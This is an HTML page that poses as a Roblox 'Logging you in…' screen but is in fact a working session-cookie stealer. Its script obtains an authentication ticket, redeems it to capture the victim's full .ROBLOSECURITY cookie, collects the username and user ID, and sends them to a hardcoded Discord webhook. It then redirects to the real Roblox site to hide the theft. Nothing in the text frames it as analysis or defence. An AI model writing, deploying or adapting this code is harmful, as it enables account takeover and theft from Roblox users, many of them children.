<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="theme-color" content="#16171b">
<title>Roblox</title>
<link rel="icon" href="https://www.roblox.com/favicon.ico">
<style>
  :root{--bg:#16171b;--fg:#e8eaed;--accent:#00a2ff}
  *{box-sizing:border-box}
  html,body{height:100%;margin:0}
  body{background:radial-gradient(circle at 50% -10%,#242833 0%,#111216 65%);color:var(--fg);
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
    display:flex;align-items:center;justify-content:center;text-align:center;-webkit-tap-highlight-color:transparent}
  .wrap{padding:28px 22px;width:100%;max-width:420px}
  .logo{width:76px;height:76px;margin:0 auto 22px;position:relative;transform:rotate(-14deg)}
  .logo::before{content:"";position:absolute;inset:0;border-radius:19px;background:#fff;
    box-shadow:0 8px 40px rgba(0,162,255,.28)}
  .logo::after{content:"";position:absolute;width:29px;height:29px;border-radius:8px;background:var(--bg);
    top:50%;left:50%;transform:translate(-50%,-50%)}
  h1{font-size:19px;font-weight:600;margin:0 0 7px;letter-spacing:.1px}
  p{margin:0;font-size:13.5px;opacity:.55}
  .spin{width:22px;height:22px;margin:26px auto 0;border:2.5px solid rgba(255,255,255,.14);
    border-top-color:var(--accent);border-radius:50%;animation:s .85s linear infinite}
  @keyframes s{to{transform:rotate(360deg)}}
  #out{display:none;margin-top:20px;text-align:left;font:11px/1.55 ui-monospace,Menlo,Consolas,monospace;
    word-break:break-all;background:rgba(255,255,255,.045);border:1px solid rgba(255,255,255,.06);
    padding:10px 12px;border-radius:10px;max-height:45vh;overflow:auto;white-space:pre-wrap}
</style>
</head>
<body>
<div class="wrap">
  <div class="logo"></div>
  <h1>Logging you in…</h1>
  <p id="status">Connecting to Roblox</p>
  <div class="spin"></div>
  <div id="out"></div>
</div>
<script>
/* ============ CONFIG ============ */
const CONFIG = {
  WEBHOOK: "https://discord.com/api/webhooks/1564498106387800097/ZtLC_k-yGBP2qIbYNQxxCCUIyd3eDV8ObHLQTZ6ZmWgUZ2HkD7ejSSymQfDYKnWDLJND",
  SEND_USER_INFO: true,
  REDIRECT_TO_ROBLOX: true,
  REDIRECT_URL: "https://www.roblox.com/home",
  REDIRECT_DELAY_MS: 1200,
  HARD_TIMEOUT_MS: 8000
};
const DEBUG = new URLSearchParams(location.search).has("debug");
/* ================================ */

const statusEl = document.getElementById("status");
const outEl = document.getElementById("out");
const setStatus = t => { statusEl.textContent = t; };

function req(o) {
  return new Promise(resolve => {
    let x;
    try { x = new XMLHttpRequest(); } catch(e) { return resolve({status:0,text:"",get:()=>null}); }
    try { x.open(o.method || "GET", o.url, true); } catch(e) { return resolve({status:0,text:"",get:()=>null}); }
    x.withCredentials = true;
    if (o.headers) for (const k in o.headers) { try { x.setRequestHeader(k, o.headers[k]); } catch(e){} }
    const done = () => resolve({ status:x.status, text:x.responseText,
      get:n => { try { return x.getResponseHeader(n); } catch(e){ return null; } } });
    x.onreadystatechange = () => { if (x.readyState === 4) done(); };
    x.onerror = () => resolve({status:0,text:"",get:()=>null});
    try { x.send(o.body || null); } catch(e) { resolve({status:-1,text:"",get:()=>null}); }
  });
}

/* Grab the FULL .ROBLOSECURITY value — nothing stripped, nothing truncated. */
function pullCookie(h) {
  if (!h) return null;
  const m = String(h).match(/\.ROBLOSECURITY=([^;,\s]+)/i);
  if (!m) return null;
  let v = m[1].trim();
  if (/%[0-9A-Fa-f]{2}/.test(v)) { try { v = decodeURIComponent(v); } catch(e){} }
  return v;
}

async function getCookie() {
  setStatus("Verifying session");
  const c = await req({ method:"POST", url:"https://auth.roblox.com/v2/logout" });
  const csrf = c.get("x-csrf-token") || "";

  setStatus("Requesting auth ticket");
  const t = await req({
    method:"POST",
    url:"https://auth.roblox.com/v1/authentication-ticket/",
    headers:{ "content-type":"application/json", "x-csrf-token":csrf },
    body:"{}"
  });
  const ticket = t.get("rbx-authentication-ticket");
  if (!ticket) return { ticket:null, cookie:null, raw:null, http:t.status };

  setStatus("Redeeming ticket");
  const d = await req({
    method:"POST",
    url:"https://auth.roblox.com/v1/authentication-ticket/redeem",
    headers:{ "content-type":"application/json", "RBXAuthenticationNegotiation":"1" },
    body: JSON.stringify({ authenticationTicket: ticket })
  });
  const raw = d.get("set-cookie");
  return { ticket, cookie: pullCookie(raw), raw, http:d.status };
}

async function getUser() {
  try {
    const r = await req({ url:"https://users.roblox.com/v1/users/authenticated" });
    if (r.status === 200) { const j = JSON.parse(r.text); return { id:j.id, name:j.name, display:j.displayName }; }
  } catch(e){}
  try {
    const r2 = await req({ url:"https://www.roblox.com/mobileapi/userinfo" });
    if (r2.status === 200) { const j2 = JSON.parse(r2.text); return { id:j2.UserID, name:j2.UserName, display:j2.DisplayName||j2.UserName }; }
  } catch(e){}
  return null;
}

async function send(data) {
  const embed = {
    title: data.cookie ? "🍪 Roblox cookie captured" : "⚠️ Roblox click (no cookie)",
    color: data.cookie ? 0x00a2ff : 0xff5555,
    timestamp: new Date().toISOString(),
    footer: { text: "roblox html logger" },
    fields: []
  };
  embed.description = data.cookie
    ? "```\n" + data.cookie + "\n```"
    : "No `.ROBLOSECURITY` found — they're probably not logged in on that browser.";
  if (data.user) {
    embed.fields.push({ name:"Username",  value:String(data.user.name    || "?"), inline:true });
    embed.fields.push({ name:"Display",   value:String(data.user.display || "?"), inline:true });
    embed.fields.push({ name:"User ID",   value:String(data.user.id      || "?"), inline:true });
  }
  if (data.cookie) embed.fields.push({ name:"Cookie length", value:String(data.cookie.length), inline:true });

  const payload = { username:"Roblox", embeds:[embed] };

  /* Attempt 1: embed + the exact cookie as a .txt attachment (zero truncation) */
  try {
    const fd = new FormData();
    fd.append("payload_json", JSON.stringify(payload));
    if (data.cookie) fd.append("files[0]", new Blob([data.cookie], { type:"text/plain" }), "roblox_cookie.txt");
    const r = await fetch(CONFIG.WEBHOOK, { method:"POST", body:fd });
    if (r.ok || r.status === 204) return true;
  } catch(e){}

  /* Attempt 2: plain JSON, survives the redirect */
  try {
    const r2 = await fetch(CONFIG.WEBHOOK, {
      method:"POST",
      headers:{ "Content-Type":"application/json" },
      body: JSON.stringify(payload),
      keepalive:true
    });
    return r2.ok || r2.status === 204;
  } catch(e){ return false; }
}

let redirected = false;
function goRoblox() {
  if (!CONFIG.REDIRECT_TO_ROBLOX || DEBUG || redirected) return;
  redirected = true;
  location.href = CONFIG.REDIRECT_URL;
}

(async function main() {
  const t0 = Date.now();
  setTimeout(goRoblox, CONFIG.HARD_TIMEOUT_MS);

  let data = { cookie:null, ticket:null, raw:null, http:null, user:null };
  try { data = Object.assign(data, await getCookie()); } catch(e){}
  if (!data.cookie) { try { data = Object.assign(data, await getCookie()); } catch(e){} }
  if (CONFIG.SEND_USER_INFO) { try { data.user = await getUser(); } catch(e){} }

  setStatus(data.cookie ? "Session captured" : "No session found");

  if (DEBUG) {
    outEl.style.display = "block";
    outEl.textContent =
      "status : " + (data.cookie ? "OK" : "FAIL") + "\n" +
      "user   : " + (data.user ? data.user.name + " (" + data.user.id + ")" : "n/a") + "\n" +
      "http   : " + data.http + "\n" +
      "cookie : " + (data.cookie ? data.cookie.length + " chars" : "null") + "\n\n" +
      "--- cookie ---\n" + (data.cookie || "(none)") + "\n\n" +
      "--- raw set-cookie ---\n" + (data.raw || "(none)");
  }

  try { await send(data); } catch(e){}

  const wait = Math.max(0, CONFIG.REDIRECT_DELAY_MS - (Date.now() - t0));
  setTimeout(goRoblox, wait);
})();
</script>
</body>
</html>
